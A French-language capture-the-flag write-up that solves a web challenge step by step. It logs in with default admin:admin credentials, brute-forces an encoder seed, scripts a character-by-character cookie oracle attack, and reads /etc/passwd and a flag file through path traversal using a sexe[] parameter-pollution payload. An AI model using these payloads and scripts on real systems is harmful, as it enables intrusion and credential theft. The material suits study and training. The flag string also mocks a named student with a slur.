# WU - Challenge 15/01

# Découverte

Pour ce nouveau challenge, nous avons accès à une page Web : [https://challrob1.cyberlog.dev/](https://challrob1.cyberlog.dev/) 

Le site est composé de : 

- Une page de Login vers un ENT : [https://challrob1.cyberlog.dev/ENT](https://challrob1.cyberlog.dev/ENT)
- Une page [https://challrob1.cyberlog.dev/singes](https://challrob1.cyberlog.dev/singes) qui semble inutile
- Une page [https://challrob1.cyberlog.dev/#](https://challrob1.cyberlog.dev/#) qui est vide
- La page d’accueil avec des noms :
    - Bastien COUTAND
    - Marc BERNARD
    - Enzo DENOUE
    - et une photo de Lucas CHAPRON

# Login - ENT

Sans plus d’informations, nous allons nous concentré sur la page de **login.**

Les injections classiques de type ‘SQL’ ne semblent mener à rien.

Après plusieurs test, on teste une combinaire username:password classique sous 

**CWE-1391: Use of Weak Credentials** (admin:admin)

```jsx
curl -X POST -d "pseudo=admin&password=admin" https://challrob1.cyberlog.dev/loginENT
Found. Redirecting to /ent_admin
```

La combinaison fonctionne, nous sommes redirigés vers `/ent_admin` :

# ENT - Admin

La page personnelle de l’admin comprend un calendrier avec 2 tâches : 

- `TODO : Faire valider mon encodeur de TODO sous /CryptoNique`
- `D:sc s _rsei e_s-dul is dm  sununT pTe-iisTrs/ODnsopdsdrip/e eosseprn_dem: rccO/mi-nrn dli_cslcsid c_ccsdssoOr  er sOTincps_dnds_ Our_  meO s/mVeo/es_ e orsissT_or cnodcdsclurddeDmV _irem:rmOcrrredoOs :Or_T_eVeVo  r_- Os-esmmr/sp_e_ eo/oDc:/r_ r`

La première tâche fais allusion à une nouvelle route : `/CryptoNique` :

```jsx
curl https://challrob1.cyberlog.dev/CryptoNique
    random.seed(random.randrange(0, 1337))
    task_clear = REDACTED
    task_out = ''.join(random.choices(flag, k=len(task_clear)*5))
    print(task_out)
```

Et la deuxième tâche est un cyphertext.

En analysant le code source, on remarque que `random.seed` est appelé avec une valeur inconnue, mais petite, qui peut être forcée. L'appel à `random.choices` prend des caractères aléatoires de la tâche pour obtenir la tâche encodée. 

En forçant la seed, nous pouvons déterminer quels caractères aléatoires ont été pris et inverser le processus pour retrouver la tâche.

```python
import random

output = "XXXX"
task_len = len(output) // 5
for seed in range(1337):
	random.seed(seed)
	choices = random.choices(list(range(task_len)), k=len(output))
	task = [''] * len(output)
	for i, v in enumerate(choices):
	    task[v] = output[i]
task = ''.join(task)
if task.startswith('TODO'): # On sait que la tâche commence par "TODO"
    print(flag)
    break

=> TODO : Virer les creds sous /__creds__/nom-prenom
```

La nouvelle route est donc `/__creds__/nom-prenom`

# Credentials

Avec la liste des étudiants sur la page principal on peut tester les combinaisons : 

```python
/__creds__/coutand-bastien
etc...
```

Après les tests, on trouve qu’une route valide est `/__creds__/bernard-marc` :

```python
curl https://challrob1.cyberlog.dev/__creds__/bernard-marc && echo ""
"mycookie" is undefined, wait is this a CWE [...]
```

Comme l’indique le texte renvoyé, il s’agit bien d’une **CWE** sur `Information Exposure` 

Essayons de placer un cookie nommé `mycookie`:

```python
curl -b mycookie=a https://challrob1.cyberlog.dev/__creds__/bernard-marc && echo ""
a is incorrect
```

La réponse change, le site semble regarder char par char si le cookie est correct. Le site return `Length of cookie do not match` si le char est correct mais pas la longueur. Codons un script python ! : 

```python
import requests

url = 'https://challrob1.cyberlog.dev'
endpoint = '/__creds__/bernard-marc'

cookie = {"mycookie": "a"}

caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}'*-+"

r = requests.get(url + endpoint, cookies=cookie)
print(r.text)

while True:
     if "is incorrect" in r.text:
         for c in caracteres:
             cookie["mycookie"] = c
             r = requests.get(url + endpoint, cookies=cookie)
             if "is incorrect" not in r.text:
                 print("Found char: " + c)
                 break
         else:
             print("Char not found")
             break
     elif "Length of cookie do not match" in r.text:
         cookie["mycookie"] += caracteres[0]
         for c in caracteres:
             cookie["mycookie"] = cookie["mycookie"][:-1] + c
             r = requests.get(url + endpoint, cookies=cookie)
             if "is incorrect" not in r.text:
                 print("Found char: " + c)
                 break
     else:
         print("Cookie found: " + cookie["mycookie"])
         print("Flag: " + r.text)
         break
```

Et après un peu de temps : 

```python
Found char: C
Found char: o
Found char: o
Found char: k
Found char: i
Found char: e
Found char: H
Found char: y
Found char: p
Found char: e
Found char: r
Found char: S
Found char: e
Found char: c
Found char: u
Found char: r
Found char: e
Found char: 1
Found char: 4
Found char: 5
Found char: 5
Found char: 7
Found char: 8
Cookie found: CookieHyperSecure145578
Flag: BernardMarc:DumbPassword
```

On trouve les creds de notre utilisateur ! 

# Projets - Marc

On retourne sur la page de Login et on test les nouveaux paires identifiants:password : 

```python
curl -X POST -d "pseudo=BernardMarc&password=DumbPassword" https://challrob1.cyberlog.dev/loginENT && echo ""
Found. Redirecting to /bernard_projects
```

On est redirigé vers `/bernard_projects`

Le site est composé d’une horloge et d’une animation, sans plus d’informations nous regardons le code source “des” pages.

Sous `[https://challrob1.cyberlog.dev/js/bernard_projects.js](https://challrob1.cyberlog.dev/js/bernard_projects.js)` : 

```python
curl https://challrob1.cyberlog.dev/js/bernard_projects.js | grep Secret
	// Secret endpoint: /bernard_projects/monkeygen?sexe=X
```

On trouve une nouvelle sous-page : `/bernard_projects/monkeygen?sexe=X` :

En changeant le sexe par `m/f` : 

```python
curl https://challrob1.cyberlog.dev/bernard_projects/monkeygen?sexe=f
{"name":"Aloysia"}
```

On peut tester une LFI : 

```python
curl https://challrob1.cyberlog.dev/bernard_projects/monkeygen?sexe=../server.js
{"error":"Only one letter is allowed and sexe can't be neutral XD"}
```

Aïe, le serveur semble regarder si le paramètre placé après `?sexe=` a une longueur exactement égale à `1` : 

Le backend étant en `nodejs`, nous devons contourner la condition `length == 1,` et nous pourrions ainsi exploiter une LFI puisque l'entrée n'est pas filtrée.

On va donc exploiter de la pollution de paramètre en HTTP afin de bypass ce check.

La solution consiste à convertir l'entrée directement en liste, comme : 

```python
curl https://challrob1.cyberlog.dev/bernard_projects/monkeygen?sexe[]=../../../../etc/passwd
{"name":"backup:x:34:34:backup:/var/backups:/usr/sbin/nologin"}
```

ça fonctionne effectivement, on arrive à afficher `/etc/passwd` affichons flag.txt : 

```python
curl https://challrob1.cyberlog.dev/bernard_projects/monkeygen?sexe[]=../flag.txt
{"name":"CLOG{This_Monkey_BernardMarc_Is_Retarded_He_Thinks_He_Is_A_Programmer}"}
```

Et on flag ! 

- CLOG{This_Monkey_BernardMarc_Is_Retarded_He_Thinks_He_Is_A_Programmer}